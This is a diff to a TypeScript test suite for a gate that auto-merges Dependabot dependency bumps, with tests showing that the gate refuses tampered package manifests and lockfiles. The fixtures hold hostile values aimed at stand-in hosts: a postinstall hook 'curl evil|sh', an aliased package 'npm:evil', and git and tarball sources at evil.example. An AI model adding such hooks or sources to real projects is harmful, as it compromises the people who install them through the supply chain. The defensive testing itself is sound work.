@@ -57,6 +57,31 @@ function botCommit(
   };
 }
 
+const BASE_SHA = "1111111122222222333333334444444455555555";
+
+// A manifest that only moves a version, and a lockfile that only names the
+// registry -- what a real Dependabot change looks like from the inside.
+const DEFAULT_CONTENTS: Record<string, unknown> = {
+  [`package.json@${BASE_SHA}`]: {
+    name: "yourpeer",
+    scripts: { "check-types": "tsc --noEmit" },
+    dependencies: { next: "15.5.9" },
+  },
+  [`package.json@${HEAD_SHA}`]: {
+    name: "yourpeer",
+    scripts: { "check-types": "tsc --noEmit" },
+    dependencies: { next: "15.5.19" },
+  },
+  [`package-lock.json@${HEAD_SHA}`]: {
+    packages: {
+      "": { name: "yourpeer" },
+      "node_modules/next": {
+        resolved: "https://registry.npmjs.org/next/-/next-15.5.19.tgz",
+      },
+    },
+  },
+};
+
 function passingCheck(name: string) {
   return { name, status: "completed", conclusion: "success" };
 }
@@ -72,7 +97,7 @@ function fixture(overrides: State = {}) {
       draft: false,
       mergeable: true,
       user: { login: "dependabot[bot]" },
-      base: { ref: "main", sha: "1111111122222222333333334444444455555555" },
+      base: { ref: "main", sha: BASE_SHA },
       head: {
         ref: "dependabot/npm_and_yarn/next-15.5.19",
         sha: HEAD_SHA,
@@ -89,6 +114,9 @@ function fixture(overrides: State = {}) {
     reviews: [],
     checkRuns: [passingCheck("check-types"), passingCheck("Unit Tests")],
     checkCount: undefined as number | undefined,
+    // Contents keyed by `${path}@${ref}`; the gate reads both sides of every
+    // manifest and the head side of every lockfile.
+    contents: undefined as Record<string, unknown> | undefined,
     status: { state: "success", total_count: 1 },
     ...overrides,
   };
@@ -136,6 +164,18 @@ function makeApi(state: ReturnType<typeof fixture>) {
       };
     }
     if (path.endsWith("/status")) return state.status;
+    const file = path.match(/\/contents\/(.+)\?ref=(.+)$/);
+    if (file) {
+      const [, filePath, ref] = file;
+      const store = state.contents ?? DEFAULT_CONTENTS;
+      const found = store[`${filePath}@${ref}`];
+      if (found === undefined) {
+        const missing = new Error(`not found: ${filePath}@${ref}`);
+        (missing as Error & { status: number }).status = 404;
+        throw missing;
+      }
+      return JSON.stringify(found);
+    }
     throw new Error(`unexpected request: ${method} ${path}`);
   };
   return { api, calls };
@@ -500,5 +540,100 @@ describe("state that changes during inspection", () => {
     expect(
       paths.indexOf("/repos/" + REPO + "/pulls/643/reviews?per_page=100"),
     ).toBeGreaterThan(paths.findIndex((path) => path.includes("/check-runs")));
+  });
+});
+
+describe("reading the change rather than trusting its description", () => {
+  // The exploit Codex reproduced: a collaborator can have GitHub sign a commit
+  // attributed to Dependabot, so correct-looking patch metadata proves nothing
+  // about what the manifest actually does. CI runs these scripts.
+  const withContents = (overrides: Record<string, unknown>) => ({
+    ...DEFAULT_CONTENTS,
+    ...overrides,
+  });
+
+  const refusesContents = async (
+    contents: Record<string, unknown>,
+    expected: RegExp,
+  ) => {
+    const { result, mutations } = await decide({ contents });
+    expect(result.outcome).toBe("skipped");
+    expect(result.reason).toMatch(expected);
+    expect(mutations).toEqual([]);
+  };
+
+  it("refuses a manifest that neuters a CI script alongside a real bump", async () => {
+    await refusesContents(
+      withContents({
+        [`package.json@${HEAD_SHA}`]: {
+          name: "yourpeer",
+          scripts: { "check-types": "true" },
+          dependencies: { next: "15.5.19" },
+        },
+      }),
+      /changes `scripts` in package\.json/,
+    );
+  });
+
+  it("refuses a postinstall hook added under a dependency bump", async () => {
+    await refusesContents(
+      withContents({
+        [`package.json@${HEAD_SHA}`]: {
+          name: "yourpeer",
+          scripts: {
+            "check-types": "tsc --noEmit",
+            postinstall: "curl evil|sh",
+          },
+          dependencies: { next: "15.5.19" },
+        },
+      }),
+      /changes `scripts` in package\.json/,
+    );
+  });
+
+  it("refuses an aliased dependency, which is a different package entirely", async () => {
+    await refusesContents(
+      withContents({
+        [`package.json@${HEAD_SHA}`]: {
+          name: "yourpeer",
+          scripts: { "check-types": "tsc --noEmit" },
+          dependencies: { next: "npm:evil@1.0.0" },
+        },
+      }),
+      /not a plain version range/,
+    );
+  });
+
+  it("refuses a git or tarball source in place of a version", async () => {
+    await refusesContents(
+      withContents({
+        [`package.json@${HEAD_SHA}`]: {
+          name: "yourpeer",
+          scripts: { "check-types": "tsc --noEmit" },
+          dependencies: { next: "git+https://evil.example/next.git#v1" },
+        },
+      }),
+      /not a plain version range/,
+    );
+  });
+
+  it("refuses a lockfile that resolves a package off the registry", async () => {
+    await refusesContents(
+      withContents({
+        [`package-lock.json@${HEAD_SHA}`]: {
+          packages: {
+            "node_modules/next": {
+              resolved: "https://evil.example/next-15.5.19.tgz",
+            },
+          },
+        },
+      }),
+      /not the npm registry/,
+    );
+  });
+
+  it("still merges when the manifest only moves a version", async () => {
+    const { result } = await decide();
+    expect(result.outcome).toBe("merged");
   });
 });
